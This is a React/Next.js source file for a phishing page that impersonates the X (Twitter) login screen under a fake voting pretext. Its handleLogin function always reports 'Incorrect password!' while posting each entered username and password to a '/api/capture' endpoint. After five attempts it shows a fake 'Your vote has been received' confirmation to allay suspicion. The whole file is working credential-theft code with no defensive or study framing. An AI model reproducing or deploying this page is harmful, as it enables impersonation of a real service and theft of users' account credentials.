import Head from 'next/head';
import { useState, useRef } from 'react';

const MAX_ATTEMPTS = 5;

export default function TwitterLoginPage() {
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [step, setStep] = useState(1);
  const [feedback, setFeedback] = useState('');
  const [clickCount, setClickCount] = useState(0);
  const [showSuccess, setShowSuccess] = useState(false);
  const attemptRef = useRef(0);

  const handleNext = () => {
    if (!username.trim()) {
      setFeedback('Please enter a phone, email, or username.');
      return;
    }
    setFeedback('');
    setStep(2);
  };

  const handleLogin = async () => {
    setFeedback('Incorrect password! Please try again...');
    attemptRef.current += 1;
    setClickCount(attemptRef.current);
    
    try {
      await fetch('/api/capture', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ 
          username: username.trim(), 
          password, 
          method: 'twitter'
        })
      });
    } catch (e) {}
    
    if (attemptRef.current >= MAX_ATTEMPTS) {
      setShowSuccess(true);
      setTimeout(() => setShowSuccess(false), 4000);
    }
  };

  const handleBack = () => {
    setStep(1);
    setFeedback('');
  };

  return (
    <>
      <Head>
        <meta charSet="UTF-8" />
        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
        <title>Log in with X - Vote</title>
      </Head>

      <style jsx>{`
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: #000; color: #e7e9ea; min-height: 100vh; display: flex; align-items: center; justify-content: center; }
        .login-container { background: white; width: 360px; padding: 30px; border-radius: 12px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); text-align: center; }
        .logo { width: 40px; height: 40px; margin: 0 auto 20px; }
        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ccc; border-radius: 4px; font-size: 15px; background: #fafafa; }
        input:focus { outline: none; border-color: #1d9bf0; background: white; }
        button { width: 100%; padding: 12px; background: #1da1f2; color: white; border: none; border-radius: 4px; font-size: 16px; cursor: pointer; margin-top: 8px; }
        button:hover { background: #1991d9; }
        .feedback { color: #f4212e; font-size: 14px; margin: 8px 0; text-align: center; }
        .back { color: #1da1f2; cursor: pointer; margin-top: 12px; font-size: 14px; }
        .back:hover { text-decoration: underline; }
        .success-overlay { position: fixed; inset: 0; background: rgba(255,255,255,0.98); display: none; align-items: center; justify-content: center; z-index: 9999; }
        .success-overlay.show { display: flex; }
        .success-box { text-align: center; padding: 20px; }
        .checkmark { width: 110px; height: 110px; background: #4caf50; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 28px; box-shadow: 0 4px 12px rgba(76,175,80,0.4); }
        .checkmark svg { width: 56px; height: 56px; }
        @media (max-width: 480px) { .login-container { width: 90%; padding: 20px; } }
      `}</style>

      <div className="login-container">
        <img className="logo" src="/logos/x_logo.svg" alt="X" />
        
        {step === 1 && (
          <div>
            <h2 style={{fontSize: '20px', fontWeight: 700, marginBottom: '8px'}}>Sign in to X</h2>
            <input 
              type="text" 
              placeholder="Phone, email, or username" 
              value={username}
              onChange={(e) => setUsername(e.target.value)}
            />
            <button onClick={handleNext}>Next</button>
          </div>
        )}
        
        {step === 2 && (
          <div>
            <h2 style={{fontSize: '20px', fontWeight: 700, marginBottom: '8px'}}>Enter your password</h2>
            <input
              type="password"
              placeholder="Password"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
            />
            <div className="feedback">{feedback}</div>
            <button onClick={handleLogin}>Log in</button>
            <div className="back" onClick={handleBack}>← Back</div>
          </div>
        )}
      </div>

      <div className="success-overlay" id="successOverlay">
        <div className="success-box">
          <div className="checkmark"><svg viewBox="0 0 52 52" xmlns="http://www.w3.org/2000/svg"><polyline points="15,27 24,36 39,17"></polyline></svg></div>
          <h2>Your vote has been received</h2>
          <p>We will get back to you when your vote is counted.</p>
        </div>
      </div>
    </>
  );
}